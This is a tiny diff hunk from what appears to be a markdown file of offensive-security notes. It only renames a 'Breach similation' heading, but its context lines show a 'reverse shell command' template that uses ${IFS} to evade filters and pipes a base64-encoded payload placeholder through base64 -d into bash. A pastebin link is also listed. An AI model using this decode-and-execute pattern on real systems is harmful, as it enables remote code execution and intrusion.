@@ -15,7 +15,7 @@
 # Reverse shell command
 echo${IFS}<BASE64-Encoded-Payload>|base64${IFS}-d|bash
 ```
-## Breach similation
+## Breach similation (might cancel..)
 ```
 https://pastebin.com/UycbfwRP
 ```
